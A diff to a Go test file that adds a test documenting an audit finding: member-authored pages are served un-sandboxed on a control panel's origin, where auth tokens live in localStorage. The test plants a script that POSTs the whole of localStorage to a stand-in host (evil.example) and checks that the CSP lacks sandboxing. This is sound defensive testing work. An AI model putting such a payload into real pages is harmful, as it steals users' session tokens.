@@ -38,6 +38,41 @@ func TestAppWebFileGet(t *testing.T) {
 	}
 }
 
+// A Member of an app can publish script into its web area, and the hosted
+// page is served un-sandboxed on the control panel's own origin — the same
+// origin /control keeps its bearer token in localStorage["frbr:auth:<id>"]
+// on. (The data area, by contrast, is always sandboxed — see
+// TestAppDataFileRoundTrip.) KNOWN FINDING (audit 2026, F5): flip the CSP
+// assertion into a regression test (want "sandbox") when the fix lands.
+func TestHostedAppMemberPageRunsOnPanelOrigin(t *testing.T) {
+	srv := newTestServer(t)
+	srv.config.DataDir = t.TempDir()
+	member := mustUser(t, srv, "Mel", "Member", "Active")
+	nonce, err := srv.store.CreateApp("Team Wiki", "", "", nil, nil)
+	if err != nil {
+		t.Fatalf("create app: %v", err)
+	}
+	anon := builtinAuth(t, srv, db.AuthAnonymous)
+	if err := srv.store.UpdateApp(nonce, "Team Wiki", "", "", nil, &anon.ID); err != nil {
+		t.Fatalf("open the gate: %v", err)
+	}
+	if err := srv.store.SetAppMembers(nonce, []int64{member.ID}); err != nil {
+		t.Fatalf("add member: %v", err)
+	}
+	steal := `<script>fetch("https://evil.example/c",{method:"POST",body:JSON.stringify(localStorage)})</script>`
+	if err := srv.coreWriteAppFile(member, nonce, "web", "index.html", []byte(steal), ""); err != nil {
+		t.Fatalf("member writes page: %v", err)
+	}
+
+	rr := testRequest(t, srv, http.MethodGet, "/team-wiki/", nil, nil)
+	if rr.Code != http.StatusOK || !strings.Contains(rr.Body.String(), "localStorage") {
+		t.Fatalf("hosted page = %d %q, want the member-authored page", rr.Code, rr.Body.String())
+	}
+	if csp := rr.Header().Get("Content-Security-Policy"); strings.Contains(csp, "sandbox") {
+		t.Errorf("Content-Security-Policy = %q, want un-sandboxed (finding F5: member script on the panel origin)", csp)
+	}
+}
+
 func TestAppWebFileGetNested(t *testing.T) {
 	srv := newTestServer(t)
 	nonce := createApp(t, srv, "nested")
